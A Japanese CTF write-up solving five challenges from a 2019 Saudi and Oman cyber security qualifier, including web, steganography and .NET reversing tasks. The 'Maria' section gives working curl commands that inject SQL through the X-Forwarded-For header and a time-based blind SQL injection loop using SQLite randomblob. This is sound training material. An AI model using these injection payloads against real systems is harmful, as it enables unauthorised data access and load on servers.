# [予選: Saudi and Oman National Cyber Security CTF 2019](https://ke1ju.github.io/ctf/2019/201902-saudi-oman-ctf.html)

2019/02/08(金) 01:00 ～ 2019/02/10(日) 06:00

https://cybertalents.com/competitions/quals-saudi-oman-national-cyber-security-ctf-2019/  
結果：65位/457チーム 6問回答/550ポイント

## 問題  
[Back to basics(Web easy)](#back-to-basics)  
[Maria(Web hard)](#maria)  
[I love images(Forensics easy)](#i-love-images)  
[Hack a nice day(Forensics medium)](#hack-a-nice-day)  
[I love this guy(Reverse medium)](#i-love-this-guy)  

## Back to basics

Category|Web Security
Level|easy
Points|50

問題
not pretty much many options. No need to open a link from a browser, there is always a different way  
Link: http://35.197.254.240/backtobasics  



ブラウザでアクセスするとwww.google.comにリダイレクトされる  
curlで応答を確認すると  

http://35.197.254.240/backtobasics/にリダイレクト
```
$ curl -i http://35.197.254.240/backtobasics
HTTP/1.1 301 Moved Permanently
Server: nginx/1.10.3 (Ubuntu)
Date: Sun, 10 Feb 2019 14:47:55 GMT
Content-Type: text/html
Content-Length: 194
Location: http://35.197.254.240/backtobasics/
Connection: keep-alive
Allow: GET, POST, HEAD,OPTIONS

<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.10.3 (Ubuntu)</center>
</body>
</html>
```

javascriptでwww.google.comにリダイレクト
```
$ curl -i http://35.197.254.240/backtobasics/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sun, 10 Feb 2019 14:50:01 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Allow: GET, POST, HEAD,OPTIONS


<script> document.location = "http://www.google.com"; </script>
```

コンテンツには特におかしな点はないので、試行錯誤。  
GET以外でアクセスを試してみる
```
$ curl -X POST -i http://35.197.254.240/backtobasics/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sun, 10 Feb 2019 14:53:46 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Allow: GET, POST, HEAD,OPTIONS

<!--
var _0x7f88=["","join","reverse","split","log","ceab068d9522dc567177de8009f323b2"];function reverse(_0xa6e5x2){flag= _0xa6e5x2[_0x7f88[3]](_0x7f88[0])[_0x7f88[2]]()[_0x7f88[1]](_0x7f88[0])}console[_0x7f88[4]]= reverse;console[_0x7f88[4]](_0x7f88[5])
-->
```
JavaScriptのコードがかえってきている。
処理内容は単純に特定の文字列をreverseしているだけ

整形後
```
var function reverse(_0xa6e5x2){
  flag=_0xa6e5x2[split]("")[reverse]()[join]("")
}
console[log]=reverse;
console[log](ceab068d9522dc567177de8009f323b2);
```

reverseをした値を求めて、回答
```
$ echo ceab068d9522dc567177de8009f323b2 |rev
2b323f9008ed771765cd2259d860baec
```

答え：2b323f9008ed771765cd2259d860baec

***
## Maria

Category|Web Security
Level|hard
Points|200

問題

Maria is the only person who can view the flag  
Link: http://35.222.174.178/maria/  



アクセスすると、リンクもスクリプトも入力フォームもなにもない、素のWebサイトが表示される。  
本文には
`
Welcome to our website!
Say hi to Maria! its the only person who can reveal the flag
`
と書いてある。  
Mariaとしてアクセスするとflagが表示されるよう。  

index.htmlだと404、index.phpだとページが表示されるため、phpで動的にコンテンツを返している。
curlでアクセスすると、冒頭にsql文が表示されることに気がつく。

```
$ curl -s http://35.222.174.178/maria/  |head -3
SELECT * FROM nxf8_sessions where ip_address = 'nn.nn.153.130'<!DOCTYPE html>
<html lang="en">
  <head>
```

IPアドレスを元にselectを実施している。  
これでMariaだと、flagが表示されるようにしている仕組みのよう。  
流石にIPアドレスは変えられないため、IPを表すX-Forwarded-Forヘッダを試してみたところ、ヘッダの値が入力されている。  

```
$ curl -H 'X-Forwarded-For: 1.1.1.1' -s http://35.222.174.178/maria/  |head -3
SELECT * FROM nxf8_sessions where ip_address = '1.1.1.1'<!DOCTYPE html>
<html lang="en">
  <head>
```

これを元にSQLインジェクションしていくが、どのようなSQL文を実行しても表示されるのはSQL文のみで結果は表示されない（結果がMariaだった場合のみFLAGが表示される）ため、カラム名が特定できない。  
指定したカラム名が存在しない場合は、コンテンツなしで、エラーメッセージだけ表示される。（エラーメッセージ的にDBはSQLite）

```
$ curl -H "X-Forwarded-For: 1.1.1.1' or username = 'Maria" -s http://35.222.174.178/maria/  
SELECT * FROM nxf8_sessions where ip_address = '1.1.1.1' or username = 'Maria'Error : HY000 1 no such column: username
```
勘でカラム名を入れてみるものの、idが使えそうということしかわからない。  
id = Mariaやid = mariaやid = MARIAを試したがダメ。  
```
$ curl -H "X-Forwarded-For: 1' or id = 'MARIA" -s http://35.222.174.178/maria/ | grep -i -e select -e flag
SELECT * FROM nxf8_sessions where ip_address = '1' or id = 'MARIA'<!DOCTYPE html>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
```

そこでブラインドSQLインジェクションでカラム名の特定ができないか試してみることに。
Select結果を元にエラーを出すのは難しそうなので、エラーベースは難しそう。

SQLiteの場合、タイムベースでは「randomblob」関数を利用して、大きな乱数を生成させるために時間がかかることを元に判断する。
サーバのCPU負荷がかかるので、無闇に使うとサーバに負荷がかかる可能性がある。
最小限（探しているものが見つかった時だけ実行されるように）にして、ローカルでSQLiteの環境を用意して、テストした上で利用することに。

例）ia,ib,icはないが、idの時は応答に時間がかかる。

```
TIME=100000000
URL=http://35.222.174.178/maria/
SQL="or (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='nxf8_sessions') and "

$ for i in {a..z} {0..9} ; do STR="%i${i}%";(time curl -s -H "X-Forwarded-For: 1' ${SQL} '${STR}' escape '@' and 1 = randomblob(${TIME});" ${URL} )2>&1 | grep -i -e read -e select -e flag -e real; done

SELECT * FROM nxf8_sessions where ip_address = '1' or (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='nxf8_sessions') LIKE  '%ia%' escape '@' and 1 = randomblob(100000000);'<!DOCTYPE html>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
real	0m0.400s

SELECT * FROM nxf8_sessions where ip_address = '1' or (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='nxf8_sessions') LIKE  '%ib%' escape '@' and 1 = randomblob(100000000);'<!DOCTYPE html>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
real	0m0.352s

SELECT * FROM nxf8_sessions where ip_address = '1' or (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='nxf8_sessions') LIKE  '%ic%' escape '@' and 1 = randomblob(100000000);'<!DOCTYPE html>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
real	0m0.358s

SELECT * FROM nxf8_sessions where ip_address = '1' or (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='nxf8_sessions') LIKE  '%id%' escape '@' and 1 = randomblob(100000000);'<!DOCTYPE html>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
real	0m2.669s

SELECT * FROM nxf8_sessions where ip_address = '1' or (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='nxf8_sessions') LIKE  '%ie%' escape '@' and 1 = randomblob(100000000);'<!DOCTYPE html>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
real	0m0.347s

```

user_id id ip_address session_idのカラムを確認。
user_idでMariaを試すが、flagは表示されない。

さらに探索を進めると、user_idは1,3,5が存在する。

user_id = 1、user_id = 3、user_id = 5で試しても何も表示されず。ブラウザで2度目のアクセスをした際に、冒頭のSQL文が消えるのを思い出し、cookieを指定して2度目のアクセスを試すと、user_id = 5でflagが表示される。

```
$ curl -b cookie -c cookie -H "X-Forwarded-For: 1.1.1.ser_id = '5" http://35.222.174.178/maria/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Welcome to our website</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">Maria Website</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          
        </div><!--/.navbar-collapse -->
      </div>
    </nav>
    <div class="alert alert-info" style="margin: 50px 0 0 0;">
        Privacy Note: Your IP is stored in our database for a security tracking reasons.
    </div>

    <div class="jumbotron">
      <div class="container">
        <h1>Welcome to our website!</h1>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
        <h3>Hello Maria : your secret flag is : aj9dhAdf4</h3>      </div>
    </div>

  </body>
</html>
```

答え：aj9dhAdf4

***
## I love images

Category|Digital Forensics
Level|easy
Points|50

問題

A hacker left us something that allows us to track him in this image, can you find it?
Link: https://s3-eu-west-1.amazonaws.com/hubchallenges/Forensics/godot.png



png画像が渡されるが、データの後に文字列がついている。

```
$ strings godot.png |tail -1
IZGECR33JZXXIX2PNZWHSX2CMFZWKNRUPU======
```

大文字英数字のみ。BASE32でデコードできる。

答え：FLAG{Not_Only_Base64}

***
## Hack a nice day

Category|Digital Forensics
Level|medium
Points|100

can you get the flag out to hack a nice day. Note: Flag format flag{XXXXXXX}
Link: https://s3-eu-west-1.amazonaws.com/hubchallenges/Forensics/info.jpg



jpgファイルが渡される。

EXIFを確認すると、commentに「badisbad」という怪しい文字列が。

```
$ exiftool info.jpg 
ExifTool Version Number         : 11.01
File Name                       : info.jpg
Directory                       : .
File Size                       : 5.5 kB
File Modification Date/Time     : 2019:02:09 02:21:42+09:00
File Access Date/Time           : 2019:02:09 02:21:48+09:00
File Inode Change Date/Time     : 2019:02:09 02:21:45+09:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : badisbad
Image Width                     : 194
Image Height                    : 259
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 194x259
Megapixels                      : 0.050
```

ツールを試してみる。steghideでキーワードに「badisbad」を指定すると、flaggg.txtが取り出せる。

```
$ steghide extract -sf info.jpg -p badisbad
wrote extracted data to "flaggg.txt".

$ cat flaggg.txt 
flag{Stegn0_1s_n!ce}
```

答え：flag{Stegn0_1s_n!ce}

***
## I love this guy

Category|Malware Reverse Engineering
Level|medium
Points|100

問題

Can you find the password to obtain the flag?
Link: https://s3-eu-west-1.amazonaws.com/hubchallenges/Reverse/ScrambledEgg.exe



ScrambledEgg.exeというwindows実行ファイルが渡される。
実行すると「Password」欄と「Get Flag!!」ボタンが表示される。
正しい値をPasswordに入れてGetFlagを押すと、Flagが出てくるよう。

dnSpyで関数の処理を確認すると、怪しい処理が見つかる。

```
Letters : char[]

// FirstWPFApp.MainWindow
// Token: 0x04000001 RID: 1
public char[] Letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_".ToCharArray();
```

```
Button_Click(object, RoutedEventArgs) : void

// FirstWPFApp.MainWindow
// Token: 0x06000005 RID: 5 RVA: 0x0000209C File Offset: 0x0000029C
private void Button_Click(object sender, RoutedEventArgs e)
{
	string value = new string(new char[]
	{
		this.Letters[5],
		this.Letters[14],
		this.Letters[13],
		this.Letters[25],
		this.Letters[24]
	});
	if (this.TextBox1.Text.Equals(value))
	{
		MessageBox.Show(new string(new char[]
		{
			this.Letters[5],
			this.Letters[11],
			this.Letters[0],
			this.Letters[6],
			this.Letters[26],
			this.Letters[8],
			this.Letters[28],
			this.Letters[11],
			this.Letters[14],
			this.Letters[21],
			this.Letters[4],
			this.Letters[28],
			this.Letters[5],
			this.Letters[14],
			this.Letters[13],
			this.Letters[25],
			this.Letters[24],
			this.Letters[27]
		}));
	}
}
```

文字列FONZYと一致する場合に、メッセージボックスで「FLAG{I_LOVE_FONZY}」と出力している。

答え：FLAG{I_LOVE_FONZY}

***



